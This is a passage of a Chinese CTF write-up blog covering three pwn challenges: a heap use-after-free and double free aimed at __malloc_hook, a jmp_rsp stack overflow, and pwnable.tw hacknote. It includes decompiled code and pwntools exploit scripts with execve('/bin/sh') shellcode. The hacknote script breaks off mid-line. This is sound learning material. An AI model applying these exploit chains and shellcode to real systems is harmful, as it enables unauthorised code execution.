class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">show_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0xF</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *((_QWORD *)&amp;notes + v1) )<br>      <span class="hljs-built_in">puts</span>(*((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)&amp;notes + v1));<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Page not found.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There are only 16 pages in this notebook.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出notes上的指针</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>有个非常明显的 UAF，libcbase 是肯定得泄露出来的，可以利用 double free 打 __malloc_hook 或者 __free_hook，这里选择用 __malloc_hook 打 one_gadget</p><ul><li>首先分配 8 个 unsortedbin 大小内堆块，然后全部 delete 掉，前 7 个进入 tcache，第 8 个进入 unsortedbin ，show(7) 即可泄露 libcbase</li><li>再次分配 9 个 fastbins （下标选择 0-8）大小内堆块，然后全释放，然后 fastbins 内部就会变成这样 8-&gt;7</li><li>再次 delete(7)，fastbins 内部变为 7-&gt;8-&gt;7</li><li>然后分配相同大小，把第一个 7 分配走，由于 tcache，剩下的 8-&gt;7 就会转移到 tcache 之中，我们在分配的时候往 next 指针里面写入 __malloc_hook，这样 tcache 中就会形成 8-&gt;7-&gt;malloc_hook，再分配三次即可得到 malloc_hook，直接往里面写入 ogg 即可</li></ul><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>r=remote(<span class="hljs-string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="hljs-number">24009</span>)<br>ru=<span class="hljs-keyword">lambda</span> x:r.recvuntil(x)<br>sl=<span class="hljs-keyword">lambda</span> x:r.sendline(x)<br>sla=<span class="hljs-keyword">lambda</span> a,b:r.sendlineafter(a,b)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>    ru(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>    sl(<span class="hljs-string">&quot;1&quot;</span>)<br>    ru(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    sl(<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>) <span class="hljs-comment"># 8</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(i)<br>show(<span class="hljs-number">7</span>)<br>libcbase=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">96</span>-<span class="hljs-number">0x1ebb80</span>-<span class="hljs-number">0x1000</span><br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>malloc_hook=libcbase+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] system_addr: &quot;</span>,<span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>) <span class="hljs-comment"># 0-8</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    delete(i) <span class="hljs-comment"># fastbins 8-&gt;7</span><br>delete(<span class="hljs-number">7</span>) <span class="hljs-comment"># 7-&gt;8-&gt;7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(i,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>) <span class="hljs-comment"># 0-6</span><br>ogg=[<span class="hljs-number">0xe3afe</span>,<span class="hljs-number">0xe3b01</span>,<span class="hljs-number">0xe3b04</span>]<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,p64(malloc_hook)) <span class="hljs-comment"># 8-&gt;7 0=7</span><br>pause()<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>) <br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;aa&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x20</span>,p64(libcbase+ogg[<span class="hljs-number">1</span>]))<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到了一种新方法，因为 2.31 的 tcache 中加入了 key 来检测 double free，为了绕过其，我们就可以利用 fastbins 来实现</p><p>首先利用一些漏洞在 fastbins 内形成比如 chunk0-&gt;chunk1-&gt;chunk0 的结构，然后分配 chunk0，chunk1-&gt;chunk0 就会进入 tcache 之中，然后我们就可以随便写 chunk0 的 next，而且还不用绕过 size 域的检查</p><h1 id="广东省大学生攻防大赛-2022-jmp-rsp"><a href="#广东省大学生攻防大赛-2022-jmp-rsp" class="headerlink" title="[广东省大学生攻防大赛 2022]jmp_rsp"></a>[广东省大学生攻防大赛 2022]jmp_rsp</h1><h2 id="标签-1"><a href="#标签-1" class="headerlink" title="标签"></a>标签</h2><p>shellcode 栈溢出</p><h2 id="checksec-2"><a href="#checksec-2" class="headerlink" title="checksec"></a>checksec</h2><p>只开了canary</p><p>静态链接</p><h2 id="IDA-2"><a href="#IDA-2" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v3; <span class="hljs-comment">// cl</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-80h] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-string">&quot;this is a classic pwn&quot;</span>, (_DWORD)argv, (_DWORD)envp, v3);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100u</span>LL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到虽然说有 canary 保护但是程序中并没有真正的启用，所以我们不用管 canary</p><p>非常明显的栈溢出</p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>题目给出了很明显的提示，jmp_rsp，可以利用 shellcode，将 getshell 的 shellcode 写在返回地址之后，将返回地址写完 jmp_rsp 即可</p><p>原理就在于执行 leave 时会把 rsp 的值改为 rbp，并且 pop rbp，此时 rsp 指向返回地址，接着 ret，也就是 pop rip，此时 rsp 指向我们的 shellcode，由于返回地址是 jmp_rsp，所以就可以执行我们的 shellcode 了</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>r=remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28053</span>)<br>jmp_rsp=<span class="hljs-number">0x46d01d</span><br>shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rax,0x68732f6e69622f</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rdi,rsp  </span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov rax,0x3b</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode=asm(shellcode)<br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>)+p64(jmp_rsp)+shellcode<br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="pwnable-tw-hacknote"><a href="#pwnable-tw-hacknote" class="headerlink" title="pwnable.tw hacknote"></a>pwnable.tw hacknote</h1><h2 id="checksec-3"><a href="#checksec-3" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">yyyffff@yyyffff-virtual-machine:~/Desktop/all/hacknote$ checksec hn<br>[*] <span class="hljs-string">&#x27;/home/yyyffff/Desktop/all/hacknote/hn&#x27;</span><br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8046000)<br></code></pre></td></tr></table></figure><h2 id="IDA-3"><a href="#IDA-3" class="headerlink" title="IDA"></a>IDA</h2><h3 id="main-2"><a href="#main-2" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      menu();<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>      v0 = atoi(buf);<br>      <span class="hljs-keyword">if</span> ( v0 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      delete();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v0 &gt; <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v0 == <span class="hljs-number">3</span> )<br>      &#123;<br>        show();<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">if</span> ( v0 == <span class="hljs-number">4</span> )<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>LABEL_13:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choice&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v0 != <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      add();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="add-2"><a href="#add-2" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sub_8048646</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [esp+10h] [ebp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [esp+14h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-keyword">if</span> ( dword_804A04C &lt;= <span class="hljs-number">5</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !*(&amp;ptr + i) )<br>      &#123;<br>        *(&amp;ptr + i) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>);<br>        <span class="hljs-keyword">if</span> ( !*(&amp;ptr + i) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        *(_DWORD *)*(&amp;ptr + i) = print;         <span class="hljs-comment">// 记录print的指针,记录在上面分配的8bytes块上</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note size :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8u</span>);<br>        size = atoi(buf);<br>        v0 = (<span class="hljs-type">int</span>)*(&amp;ptr + i);<br>        *(_DWORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-built_in">malloc</span>(size);<br>        <span class="hljs-keyword">if</span> ( !*((_DWORD *)*(&amp;ptr + i) + <span class="hljs-number">1</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, *((<span class="hljs-type">void</span> **)*(&amp;ptr + i) + <span class="hljs-number">1</span>), size);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success !&quot;</span>);<br>        ++dword_804A04C;                        <span class="hljs-comment">// 计数的</span><br>        <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v5;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Full&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure><p>分配情况如下</p><p> <img src="/2025/05/19/IO_FILE%20Exploit/7e08b983cf40f6d12c40c6c.png" alt="img"> </p><h3 id="delete-2"><a href="#delete-2" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sub_80487D4</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= dword_804A04C )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;ptr + v1) )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)*(&amp;ptr + v1) + <span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">free</span>(*(&amp;ptr + v1));                         <span class="hljs-comment">// 先释放内容，再释放管理</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>UAF</p><h3 id="show-1"><a href="#show-1" class="headerlink" title="show"></a>show</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sub_80488A5</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= dword_804A04C )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;ptr + v1) )<br>    (*(<span class="hljs-type">void</span> (__cdecl **)(_DWORD))*(&amp;ptr + v1))(*(&amp;ptr + v1));<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14u</span>) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过记录的 print 指针来输出</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>UAF，libc 肯定要泄露，因为我们 show 时执行的是 add 里记录的 print 指针，如果我们可以控制该指针，就可以控制 eip</p><ul><li><p>首先分配一个 unsortedbin 范围内的堆，释放掉再分配回来，泄露其内容，也就是 unsortedbin 链表头地址，从而泄露 libc</p></li><li><p>分配一个堆，然后释放掉第一步的堆和这个，记该堆为 B 块，第一步为堆 A，那么其对应的 8 大小的块在fastbins 就会形成 B-&gt;A</p></li><li><p>分配大小为 8 的块，就会将管理 A 块的那个 8bytes 的堆给我们当作内容可以写入，我们往其中写入 p32(system_addr)+b’;sh’ 即可得到 flag，至于为什么我也不清楚，查的资料说是第一次 system 函数地址是其本身地址，这样肯定会报错，但是后面我用 ;sh 隔开，就会执行 system(“sh”)，并且忽略第一次报错，就可以得到 shell</p></li></ul><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>r=process(<span class="hljs-string">&#x27;./hn&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./hn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc_32.so.6&#x27;</span>)<br>sla = <span class="hljs-keyword">lambda</span> a,b : r.sendlineafter(a,b)<br>sa  = <span class="hljs-keyword">lambda</span> a,b : r.sendafter(a,b)<br>ru  = <span class="hljs-keyword">lambda</span> a  :  r.recvuntil(a)<br>se=<span class="hljs-keyword">lambda</span> a : r.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Note size :&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&quot;Content :&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    sla(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;to leak&#x27;</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x10</span>,<span 